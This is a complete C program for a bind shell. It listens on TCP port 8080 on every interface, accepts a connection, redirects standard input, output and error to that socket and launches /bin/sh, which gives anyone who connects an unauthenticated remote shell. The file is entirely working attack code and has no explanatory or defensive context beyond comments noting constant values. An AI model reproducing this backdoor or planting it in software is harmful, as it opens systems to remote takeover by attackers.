#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
 
int main(void)
{
        int clientfd, sockfd;
        int dstport = 8080;
        struct sockaddr_in mysockaddr;
 
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
        mysockaddr.sin_family = AF_INET; //2
        mysockaddr.sin_port = htons(dstport); //8080
        mysockaddr.sin_addr.s_addr = INADDR_ANY; //0
 
        bind(sockfd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));
 
        listen(sockfd, 0);
 
        clientfd = accept(sockfd, NULL, NULL);
 
        dup2(clientfd, 0);
        dup2(clientfd, 1);
        dup2(clientfd, 2);
 
        execve("/bin/sh", NULL, NULL);
        return 0;
}